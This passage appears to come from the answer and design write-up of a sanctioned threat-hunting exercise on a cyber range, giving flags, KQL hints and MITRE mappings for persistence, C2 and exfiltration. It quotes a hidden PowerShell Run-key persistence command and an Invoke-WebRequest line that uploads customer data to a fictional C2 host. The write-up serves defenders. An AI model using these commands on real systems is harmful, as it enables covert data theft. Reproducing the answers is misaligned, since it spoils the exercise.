  *PowerShell processes grouped by parent + account. `explorer.exe → powershell.exe` under `sancadmin` = human on RDP desktop. Everything else (`senseir.exe`, `gc_worker.exe`) is `system` automation (T1059.001).*
- **Persistence full command** → `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\ProgramData\Northpeak\NorthpeakSync\Bin\NorthpeakSyncTray.ps1"`
  *`DeviceRegistryEvents`, `RegistryValueSet`, `CurrentVersion\Run`. Value name `NorthpeakSyncTray`, written by `sancadmin` at 23:04. Full string from `RegistryValueData` (T1547.001).*
- **Confirming the foothold's rights** → `Administrators group, membership`
  *Second-visit burst (after the 22:42 Unlock): `whoami` → `hostname` → `whoami /groups`. Last command enumerates group membership — confirming local-admin standing (T1069.001).*

### Phase 04 — Command & Control

- **Beacon domains, cross-source** → `status.sync-northpeak.com, updates.sync-northpeak.com, cdn.sync-northpeak.com; DeviceProcessEvents`
  *Network table shows only `status` (resolved to `192.0.2.1`); all three live in `DeviceProcessEvents` command lines. First-contact order: status 23:15:47 → updates 23:15:49 → cdn 23:44:08 (T1071.001).*
- **Encoded beacon decode** → `https://cdn.sync-northpeak.com/api/beacon?id=NPT-WS01&flag=NORTHPEAK-09`
  *`-EncodedCommand` blob → `base64_decode_tostring()`. Quirk: the `has "northpeak"` filter fails on UTF-16LE null bytes — decode without it and read the results (T1027/T1140).*
- **Encoded-command discrimination** → `gc_worker.exe`
  *Encoded commands grouped by parent: `gc_worker.exe` (system) = 24, all `[Environment]::OSVersion` inventory checks; operator = 3 under `powershell.exe`/`sancadmin`. Three-layer tell: parent, account, decoded content (T1027/T1140).*
- **Beacon rhythm** → `inconsistent intervals, human operator (not automation)`
  *Gaps between `status` check-ins via `prev()` + `datetime_diff` ≈ 38s, irregular. No fixed timer → hands-on, not an implant (T1071.001, behavioral).*

### Phase 05 — Impact & Judgement

- **Crown jewel exfil** → `customer_data_export_20260616.csv, npt-srv01, cdn.sync-northpeak.com`
  *SRV01, 23:44: `Invoke-WebRequest -Uri 'https://cdn.sync-northpeak.com/api/upload...' -InFile 'C:\temp\customer_data_export_20260616.csv'`. (`wermgr.exe -upload` rows are WER noise, not exfil.) (T1041).*
- **Exfil session correlation** → `second`
  *SRV01 RemoteInteractive sessions: 21:58 (first) and 23:42 (re-entry). Exfil at 23:44 = ~76s into the second/re-entry session (T1041 + session correlation).*
- **Holding the ground** → `no tampering, living off the land`
  *Negative finding: no `Add-MpPreference`/exclusions/`Disable-`/dropped binaries anywhere (the only `disable-` hits are pip's `--disable-pip-version-check`). Operator used legitimate access + built-in tools. The quiet came from being a trusted valid account, not from disabling defenses. MITRE tactic: Defense Evasion via absence of tampering (T1078).*

---

**On the extended/technical flags:** the shipped 18 already fold in the technical-depth items an earlier draft listed separately (logon type → RemoteInteractive throughout; SRV01 access vector → external RDP; PowerShell lineage → `explorer.exe`; beacon cadence → irregular/human; encoding mechanism → base64 UTF-16LE via `-EncodedCommand`; sudo enumeration → `sudo -l`). The **operator's-own-client** gap flagged in earlier revisions is now closed: it's `loranse`, recovered from `RemoteDeviceName`.

---

## 10. What we'd do differently

- **Census the tables and pin the timezone on day one.** We lost time early treating UTC "PM" times as local. A five-minute `getschema` + timestamp sanity check per table saves an hour later.
- **Assume file events are slow, especially on secondary hosts.** We repeatedly queried too soon and briefly doubted actions that had actually succeeded. Build in a deliberate wait, or verify on disk first and treat the table as eventually-consistent.
- **Launch anything network-touching as a child process from the start.** The interactive-vs-child-process URL-visibility lesson cost us a full detour on the beacon phase. Default to `Start-Process` for beacons and exfil so the command line is always capturable.
- **Map the auth timeline before writing the narrative.** The whole option-1/option-2 pivot would've been a non-event if we'd put every logon on one timeline *before* committing to a Linux-first story. Let the evidence write the brief.
- **Keep emulated-but-cut techniques documented.** Cutting Defender tampering was right for this hunt, but having it built and written down means a harder variant can add it back in minutes.

---

## 11. Credits

**Built by Dogukan Oruc** as a community hunt for the cyber range.

All emulation was benign and sanctioned: no malware, non-resolving/blackholed C2, hand-typed fake data, executed against lab machines with snapshots and administrator sign-off. The techniques described are standard, publicly documented MITRE ATT&CK behaviors; the entire purpose of the exercise — and of this document — is to help defenders **detect** them.

*NORTHPEAK DESCENT // Community Hunt // Sentinel + MDE // law-cyber-range*
